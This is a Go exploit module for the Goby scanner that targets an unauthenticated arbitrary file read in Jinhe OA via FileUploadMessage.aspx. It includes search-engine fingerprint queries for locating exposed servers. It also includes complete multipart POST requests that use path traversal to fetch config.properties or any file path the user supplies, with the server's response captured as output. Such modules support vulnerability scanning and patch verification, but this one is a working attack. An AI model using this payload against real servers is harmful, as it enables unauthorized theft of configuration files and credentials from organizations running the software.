package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA FileUploadMessage.aspx file is vulnerable to unauthorized arbitrary file reading",
    "Description": "<p>Jinhe Digital Intelligent Office Platform (referred to as JC6) is a digital office platform that integrates artificial intelligence technology, providing enterprises with intelligent office experiences and comprehensive support for digital transformation. It complies with national Xinchuang certification standards and supports organizational digital transformation, enabling the digitalization, intelligence, and collaboration of business processes to enhance enterprise competitiveness.</p><p>Jinhe OA FileUploadMessage.aspx file is vulnerable to unauthorized arbitrary file reading, allowing attackers to exploit this vulnerability to read arbitrary files on the server and obtain sensitive server information.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2024-03-12",
    "PostTime": "2024-03-15",
    "Author": "2783712916@qq.com",
    "FofaQuery": "(title=\"金和协同管理平台\" || (body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" && body=\"/C6/WebResource.axd\") || body=\"Jinher Network\" || (body=\"/jc6/platform\" && (body=\"/jc6/common/js/uiCustom/in.js\" || body=\"/security/js/jcs-security-1.0.1.js\")))",
    "GobyQuery": "(title=\"金和协同管理平台\" || (body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" && body=\"/C6/WebResource.axd\") || body=\"Jinher Network\" || (body=\"/jc6/platform\" && (body=\"/jc6/common/js/uiCustom/in.js\" || body=\"/security/js/jcs-security-1.0.1.js\")))",
    "Level": "1",
    "Impact": "<p>Jinhe OA FileUploadMessage.aspx file is vulnerable to unauthorized arbitrary file reading, allowing attackers to exploit this vulnerability to read arbitrary files on the server and obtain sensitive server information.</p>",
    "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileReadPath",
            "type": "input",
            "value": "../../../c6/config/config.properties",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary5Ur8laykKAWws2QO1",
                    "Content-Length": "320"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundary5Ur8laykKAWws2QO1\nContent-Disposition: form-data;name=\"file\"; filename=\"xxx.aspx\"\nContent-Type: image/png\n\nreal path\n------WebKitFormBoundary5Ur8laykKAWws2QO1\nContent-Disposition: form-data;name=\"filename\"\n\n../../../c6/config/config.properties\n------WebKitFormBoundary5Ur8laykKAWws2QO1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/octet-stream",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary5Ur8laykKAWws2QO1",
                    "Content-Length": "320"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundary5Ur8laykKAWws2QO1\nContent-Disposition: form-data;name=\"file\"; filename=\"xxx.aspx\"\nContent-Type: image/png\n\nreal path\n------WebKitFormBoundary5Ur8laykKAWws2QO1\nContent-Disposition: form-data;name=\"filename\"\n\n{{{fileReadPath}}}\n------WebKitFormBoundary5Ur8laykKAWws2QO1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/octet-stream",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.3",
    "Translation": {
        "CN": {
            "Name": "金和OA FileUploadMessage.aspx 前台任意文件读取漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和数字化智能办公平台（简称JC6）是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。同时符合国家信创认证标准，支持组织数字化转型，实现业务流程的数字化、智能化和协同化，提高企业竞争力。<br></p><p>金和OA FileUploadMessage.aspx文件存在未授权任意文件读取，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。</p>",
            "Recommendation": "<p>1.联系相关厂商，获取安全补丁，及时进行漏洞修复</p><p>2.联系相关安全厂商，及时更新安全阻断策略<br></p>",
            "Impact": "<p>金和OA FileUploadMessage.aspx文件存在未授权任意文件读取，攻击者可利用该漏洞读取服务器任意文件，获取服务器敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Jinhe OA FileUploadMessage.aspx file is vulnerable to unauthorized arbitrary file reading",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe Digital Intelligent Office Platform (referred to as JC6) is a digital office platform that integrates artificial intelligence technology, providing enterprises with intelligent office experiences and comprehensive support for digital transformation. It complies with national Xinchuang certification standards and supports organizational digital transformation, enabling the digitalization, intelligence, and collaboration of business processes to enhance enterprise competitiveness.<br></p><p>Jinhe OA FileUploadMessage.aspx file is vulnerable to unauthorized arbitrary file reading, allowing attackers to exploit this vulnerability to read arbitrary files on the server and obtain sensitive server information.</p>",
            "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
            "Impact": "<p>Jinhe OA FileUploadMessage.aspx file is vulnerable to unauthorized arbitrary file reading, allowing attackers to exploit this vulnerability to read arbitrary files on the server and obtain sensitive server information.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
